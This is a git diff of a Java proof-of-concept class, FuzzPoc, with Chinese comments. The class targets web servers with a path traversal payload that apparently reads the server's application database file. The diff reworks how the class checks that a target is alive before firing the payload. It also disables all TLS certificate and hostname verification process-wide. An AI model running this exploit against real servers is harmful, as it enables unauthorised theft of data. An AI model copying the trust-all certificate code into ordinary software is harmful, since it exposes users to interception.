@@ -1,13 +1,13 @@
 package org.example;
 
-import javax.net.ssl.SSLContext;
-import javax.net.ssl.TrustManager;
-import javax.net.ssl.X509TrustManager;
+import javax.net.ssl.*;
 import java.io.IOException;
 import java.net.*;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
+import java.security.KeyManagementException;
+import java.security.NoSuchAlgorithmException;
 import java.security.cert.X509Certificate;
 import java.sql.Connection;
 import java.sql.ResultSet;
@@ -22,7 +22,7 @@ import java.util.regex.Pattern;
 public class FuzzPoc {
     public String url= "";
     public String ip = "";
-    HttpClient client;
+    public HttpClient client;
 
     static String payload_1 = "index/ajax/lang?lang=..//..//application/database";
 
@@ -38,7 +38,7 @@ public class FuzzPoc {
         return sb.toString();
     }
 
-    public FuzzPoc(String url) throws UnknownHostException {
+    public FuzzPoc(String url) throws Exception {
         this.url = url;
         // 定义用于匹配域名或IP地址的正则表达式
         String hostRegex = "https?://([\\w.-]+)(:\\d+)?";
@@ -50,49 +50,48 @@ public class FuzzPoc {
             InetAddress[] inetAddresses = InetAddress.getAllByName(host);
             this.ip = String.valueOf(inetAddresses[0]).replace("/","");
         }
-    }
-
-    public void TestAlive(){
-        try {
-            // 创建一个信任所有证书的 TrustManager
-            TrustManager[] trustAllCerts = new TrustManager[]{
-                    new X509TrustManager() {
-                        public X509Certificate[] getAcceptedIssuers() {
-                            return null;
-                        }
-                        public void checkClientTrusted(X509Certificate[] certs, String authType) {
-                        }
-                        public void checkServerTrusted(X509Certificate[] certs, String authType) {
-                        }
+        // 创建信任所有证书的 TrustManager
+        TrustManager[] trustAllCerts = new TrustManager[] {
+                new X509TrustManager() {
+                    public X509Certificate[] getAcceptedIssuers() {
+                        return null;
                     }
-            };
+                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}
+                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}
+                }
+        };
+        // 初始化 SSLContext 并禁用 SSL 验证
+        SSLContext sc = SSLContext.getInstance("SSL");
+        sc.init(null, trustAllCerts, new java.security.SecureRandom());
+        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
 
-            // 设置 SSL 上下文，使用我们自定义的 TrustManager
-            SSLContext sslContext = SSLContext.getInstance("TLS");
-            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
+        // 禁用主机名验证
+        HostnameVerifier allHostsValid = (hostname, session) -> true;
+        HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
 
-            // 创建 HttpClient，设置 SSL 上下文
-            this.client = HttpClient.newBuilder()
-                    .sslContext(sslContext)
-                    .build();
-
-            // 创建HttpRequest对象
-            HttpRequest request = HttpRequest.newBuilder()
-                    .uri(new URI(url))
-                    .GET()
-                    .build();
-
-            // 发送请求并获取响应
-            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
-            if (response.statusCode() == 200) {
-                System.out.println("\033[32;1m[+]Target:" + url + " is alive" + "\033[0m");
-            }
-        } catch (Exception e) {
-            System.out.println("\033[31;1m[-]无法连接:" + url + "\033[0m");
-        }
+        // 创建 HttpClient，设置 SSL 上下文
+        this.client = HttpClient.newBuilder()
+                .sslContext(sc)
+                .build();
     }
 
-    public void FuzzPayload_1() throws IOException, URISyntaxException, InterruptedException, SQLException {
+    public boolean TestAlive() throws Exception{
+        // 创建HttpRequest对象
+        HttpRequest request = HttpRequest.newBuilder()
+                .uri(new URI(url))
+                .GET()
+                .build();
+
+        // 发送请求并获取响应
+        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
+        if (response.statusCode() == 200) {
+            System.out.println("\033[32;1m[+]Target:" + url + " is alive" + "\033[0m");
+            return true;
+        }
+        return false;
+    }
+
+    public void FuzzPayload_1() throws Exception {
         String urlFuzz_1 = this.url + payload_1;
 
         // 创建HttpRequest对象
@@ -179,8 +178,12 @@ public class FuzzPoc {
         }
     }
 
-    public void Exp() throws IOException, URISyntaxException, InterruptedException, SQLException {
-        TestAlive();
-        FuzzPayload_1();
+    public void Exp() throws Exception {
+        if (TestAlive()){
+            FuzzPayload_1();
+        }
+        else {
+            System.out.println("\033[31;1m[-]无法连接:" + url + "\033[0m");
+        }
     }
 }
